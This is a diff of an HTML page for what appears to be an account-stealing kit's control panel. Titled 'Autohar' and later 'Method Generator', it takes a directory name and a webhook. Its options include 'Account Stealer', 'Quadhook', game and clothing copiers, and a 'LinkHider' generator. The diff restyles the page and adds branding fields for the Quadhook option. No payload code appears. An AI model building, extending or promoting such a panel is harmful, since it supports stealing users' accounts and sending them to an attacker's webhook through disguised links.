@@ -1,137 +1,139 @@
 <!DOCTYPE html>
-<html lang="es">
-
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Autohar Directory Generator</title>
-    <link rel="stylesheet" type="text/css" href="style.css">
     <style>
-        /* Text Overlay */
-        .text-overlay {
-            position: absolute;
-            top: 15%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 20px;
-            color: white;
-            text-align: center;
-            z-index: 2;
-            animation: fadeIn 2s;
-        }
-
-        /* Input Container */
-        .input-container {
-            position: absolute;
-            top: 40%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 2;
-            color: white;
-            text-align: center;
-        }
-
-        /* Input Field */
-        #directoryInput,
-        #webhookInput,
-        #optionSelect {
-            width: 300px;
-            padding: 10px;
-            border: 1px solid #ffffff;
-            border-radius: 5px;
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            font-size: 18px;
-            margin-bottom: 10px; /* Espacio entre inputs */
-            transition: border-color 0.3s;
-        }
-
-        /* Button Styles */
-        #generateButton {
-            padding: 10px 15px;
-            border: none;
-            border-radius: 5px;
-            background-color: #04AA6D; /* Color verde */
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        #generateButton:hover {
-            background-color: #038a4d; /* Color más oscuro al pasar el mouse */
-        }
-
-        /* Navigation Styles */
-        .navigation {
-            position: absolute;
-            top: 10%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: black;
-        }
-
-        .nav-list {
-            list-style: none;
-            padding: 0;
-        }
-
-        .nav-list li {
-            display: inline;
-            margin: 0 10px;
-        }
-
-        .nav-list a {
-            text-decoration: none;
-            color: blue;
-        }
-
-        /* Folder Icon */
-        .folder-icon {
-            display: block;
-            margin: 20px auto; /* Centra la imagen */
-            width: 50px; /* Controla el tamaño */
-            height: 50px; /* Controla el tamaño */
-        }
+        body, html { background: rgb(24, 24, 28) !important; }
+        .background { position: absolute; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; }
     </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create</title>
+    <!-- CSS / Bootstrap -->
+    <link href="/controlpage/css/imports.css?v=1742160749" rel="stylesheet">
+    <link href="/controlpage/css/config.css?v=1742160749&name=controlPage" rel="stylesheet">
+    <!-- SNACKBAR -->
+    <link rel="stylesheet" href="/controlPage/css/snackbar.css" />
+    <script src="/controlpage/js/snackbar.js"></script>
+    <style>
+        .swal2-container { z-index: 20000 !important; }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/particlesjs/2.2.3/particles.min.js"></script>
 </head>
 
 <body>
-    <div class="navigation">
-        <ul class="nav-list">
-            <li><a href="javascript:void(0);" id="contactLink">Contact</a></li>
-            <li><a href="https://discord.gg/MgCdjuyrXU" target="_blank" rel="noopener noreferrer">Discord</a></li>
-        </ul>
-    </div>
+    <div class="background"></div> <!-- Contenedor para las partículas -->
+    
+    <section id="login" name="regular" class="form">
+        <div class="container h-100">
+            <div class="row justify-content-center align-items-center h-100">
+                <div class="col-md-10 col-lg-5">
+                    <div class="login-box" data-aos="fade-up" data-aos-duration="1500">
+                        <center><h2>Method Generator</h2></center>
+                        <!-- LOGIN FORM -->
+                        <form method="post" id="login-form">
+                            <div class="form-input-icon mb-3 mt-4">
+                                <i class="fas fa-folder"></i>
+                                <input class="auth-input" type="text" placeholder="Directory Name" id="directory" required>
+                            </div>
+                            <div class="form-input-icon mb-3 mt-4">
+                                <i class="fas fa-gear"></i>
+                                <input class="auth-input" type="text" placeholder="Webhook" id="Webhook" required>
+                            </div>
+                            <div class="form-input-icon mb-3 mt-4" id="sname" style="display:none;">
+                                <i class="fas fa-signature"></i>
+                                <input class="auth-input" type="text" placeholder="Name here" name="sname">
+                            </div>
+                            <div class="form-input-icon mb-3 mt-4" id="sicon" style="display:none;">
+                                <i class="fas fa-image"></i>
+                                <input class="auth-input" type="text" placeholder="Thumbnail Here" name="sicon">
+                            </div>
+                            <div class="form-input-icon mb-3 mt-4" id="scolor" style="display:none;">
+                                <i class="fas fa-paintbrush" aria-hidden="true"></i>
+                                <input type="color" class="auth-input" name="scolor">
+                            </div>
+                            <select id="type" class="form-control" onchange="toggle()">
+                                <option value="quadhook">Quadhook Autohar (VERY, OP)</option>
+                                <option value="fb">Follow Bot (Autohar, Normal)</option>
+                                <option value="gc">Game Copier (Autohar, Normal)</option>
+                                <option value="cc">Clothing Copier (Autohar, Normal)</option>
+                                <option value="as">Account Stealer (Autohar, Normal)</option>
+                            </select>
+                            <button type="button" class="button primary d-block mt-3 w-100" onclick="Create(this);" style="color:black">Generate</button>
+                        </form>
+                        <!-- ~LOGIN FORM -->
+                    </div>
+                    <center>
+                        <button type="button" class="button primary d-block mt-3 w-80" onclick="window.location.replace('/control page/hyper-link');" style="color:black">
+                            <i class="fa-solid fa-repeat" style="color:black"></i> Hyperlink (LinkHider) Generator
+                        </button>
+                    </center>
+                </div>
+            </div>
+        </div>
+        <div class="overlay-top-right"></div>
+        <div class="overlay-bottom-right"></div>
+        <div class="overlay-bottom-left"></div>
+    </section>
 
-    <h1 class="text-overlay">Autohar</h1>
-    <div class="input-container">
-        <label for="directoryInput">Directory Name:</label>
-        <input type="text" id="directoryInput" placeholder="Enter a directory name" required>
+    <script src="../apis/main.js?v=1742160749"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="../js/jquery-3.3.1.min.js"></script>
+    <script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
+    <script src="../js/bootstrap.js"></script>
+    <script src="../js/core.js"></script>
 
-        <label for="webhookInput">Webhook:</label>
-        <input type="text" id="webhookInput" placeholder="Enter webhook" required>
+    <script>
+        function toggle() {
+            var type = document.getElementById("type").value;
+            var sname = document.getElementById("sname");
+            var sicon = document.getElementById("sicon");
+            var scolor = document.getElementById("scolor");
 
-        <label for="optionSelect">Select Option:</label>
-        <select id="optionSelect" required>
-            <option value="quadhook">Quadhook Autohar (VERY, OP)</option>
-            <option value="followBot">Follow Bot (Autohar, Normal)</option>
-            <option value="gameCopier">Game Copier (Autohar, Normal)</option>
-            <option value="clothingCopier">Clothing Copier (Autohar, Normal)</option>
-            <option value="accountStealer">Account Stealer (Autohar, Normal)</option>
-        </select>
+            if (type === "quadhook") {
+                sname.style.display = "block";
+                sicon.style.display = "block";
+                scolor.style.display = "block";
+            } else {
+                sname.style.display = "none";
+                sicon.style.display = "none";
+                scolor.style.display = "none";
+            }
+        }
 
-        <button id="generateButton">Generate</button>
-    </div>
-
-    <img src="folder-icon.png" alt="Folder Icon" class="folder-icon">
-    <canvas class="background"></canvas>
-
-    <div id="copyMessage" class="copy-message" style="display: none;">Copied!</div>
-
-    <!-- Required script -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/particlesjs/2.2.3/particles.min.js"></script>
-    <script type="text/javascript" src="script.js"></script>
+        window.onload = function() {
+            toggle();
+            // Inicializa las partículas de fondo
+            try {
+                Particles.init({
+                    selector: '.background',
+                    maxParticles: 100,
+                    connectParticles: true,
+                    speed: 2,
+                    minDistance: 100,
+                    sizeVariations: 3,
+                    color: '#ffffff',
+                    responsive: [
+                        {
+                            breakpoint: 768,
+                            options: {
+                                maxParticles: 50,
+                                connectParticles: false
+                            }
+                        },
+                        {
+                            breakpoint: 480,
+                            options: {
+                                maxParticles: 30,
+                                connectParticles: false
+                            }
+                        }
+                    ]
+                });
+            } catch (error) {
+                console.error("Error initializing particles:", error);
+            }
+        };
+    </script>
 </body>
-
 </html>
